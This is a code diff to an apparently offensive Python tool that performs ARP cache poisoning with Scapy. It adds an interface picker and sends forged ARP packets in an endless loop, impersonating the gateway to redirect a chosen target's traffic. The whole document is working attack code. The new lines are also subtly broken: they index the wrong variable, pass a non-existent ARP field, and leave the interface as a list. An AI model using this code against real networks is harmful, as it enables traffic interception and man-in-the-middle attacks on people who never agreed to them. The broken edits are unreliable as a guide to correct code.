@@ -25,7 +25,7 @@ gateway_mac = get_gateway_mac()
 #----------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Scapy ARP poison packet insertions under layer2 protocol 
-def arp_cache_poison(target_ip=None, router_ip=None, router_mac=None, target_mac=None, source_mac=None):
+def arp_cache_poison(iface=None, target_ip=None, router_ip=None, router_mac=None, target_mac=None, source_mac=None):
     
     try:
         target_ip_input = console.input(str("[yellow]| Enter Target IP:"))
@@ -49,15 +49,24 @@ def arp_cache_poison(target_ip=None, router_ip=None, router_mac=None, target_mac
 
         if router_mac is None:
             router_ip = router.get("Gateway")
+        
+        if iface is None:
+            iface =  netifaces.interfaces()
+            for i, ifaces in enumerate(iface, start=1):
+                print(f"{i}. {ifaces}")
+            iface_choice = int(input("Select interface: "))
+
+            iiface = ifaces[iface_choice - 1]
+            print("You chose:", iiface)
     except Exception as e:
         print(f"Var Exception Error: {e}"); return False 
      
     try:
-        print(router)
-        pkt = Ether(dst=target_mac)/ARP(psrc=router_ip, pdst=target_ip_input)
-
+        
+        pkt = Ether(dst=target_mac)/ARP(iface=iface, psrc=router_ip, pdst=target_ip_input)
 
         sendp(pkt, inter=RandNum(10,40), loop=1)
+
     except Exception as e:
         print(f"Pkt Exception Error: {e}"); return False 
 
